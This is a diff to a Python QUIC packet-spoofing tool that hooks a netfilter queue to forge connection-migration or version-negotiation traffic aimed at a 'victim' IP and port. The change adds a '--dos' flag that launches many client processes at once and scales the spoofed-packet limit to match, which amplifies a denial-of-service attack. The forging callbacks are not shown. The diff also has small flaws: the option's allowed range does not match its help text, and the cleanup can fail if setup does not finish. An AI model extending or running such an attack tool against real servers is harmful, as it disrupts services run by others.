@@ -63,7 +63,8 @@ def parse_arguments():
     optparser.add_argument('--path','-p', help='The path to request for http requests', default="/")
     optparser.add_argument('--limit','-l', help='Limits the amount of spoofed packets. A value of 0 will not limit the number of packets', type=int, default=0)
     optparser.add_argument('--alpn','-a', help='The ALPN to be used. Defaults are h3-29 for draft-29 and h3 for version 1', default='h3')
-    #optparser.add_argument('--debug','-d', help='Turn on stdout and stderr for client subprocesses', action='store_true')
+    optparser.add_argument('--dos', '-d', help='Number of client processes to be started', type=int, default=1, choices=range(1,21), metavar="[1-22]")
+    #optparser.add_argument('--verbose','-v', help='Turn on stdout and stderr for client subprocesses', action='store_true')
 
     subparsers = parser.add_subparsers(required=True, dest='mode')
     
@@ -184,6 +185,7 @@ def main():
         #Initializing netfilter queue
         q = NetfilterQueue()
         p = None
+        args.limit = args.limit * args.dos
         if args.mode == 'cm':
             q.bind(1, lambda packet, starttime=starttime, args=args : connection_migration_callback(packet, starttime, args))
         elif args.mode == 'vn':
@@ -195,8 +197,11 @@ def main():
 
         print("[+] Starting client")
         url, configuration = configure_client(args)
-        p = Process(target=cl.start_client, args=(url, configuration,))
-        p.start()
+        processes = []
+        for i in range(1,args.dos+1):
+            p = Process(target=cl.start_client, args=(url, configuration,))
+            processes.append(p)
+            p.start()
         
         print("[+] Hooking into nfqueue")
         q.run()
@@ -206,17 +211,22 @@ def main():
     except Exception as e:
         print("[!] Something went wrong!")
         print(e)
-    finally:
-        print("\n[+] Cleaning up")
-        print("[-] Terminating Client")
-        p.kill()
-        print("[-] Unbinding netfilter queue.")
-        q.unbind() 
-        print("[-] Deleting iptables rule(s).")
-        iptables_delete = iptables_tmpl.format(action="-D", victim_ip=args.victim_ip, victim_port=args.victim_port)
-        print(iptables_delete)
-        subprocess.run(iptables_delete.split())
-        print("[+] Done")
+    
+    print("\n[+] Cleaning up")     
+    print("[-] Terminating Client(s)")
+    for p in processes:
+        try:
+            p.kill()
+        except:
+            pass   
+    print("[-] Unbinding netfilter queue.")
+    q.unbind() 
+    
+    print("[-] Deleting iptables rule(s).")
+    iptables_delete = iptables_tmpl.format(action="-D", victim_ip=args.victim_ip, victim_port=args.victim_port)
+    print(iptables_delete)
+    subprocess.run(iptables_delete.split())
+    print("[+] Done")
 
     
 if __name__ == "__main__":
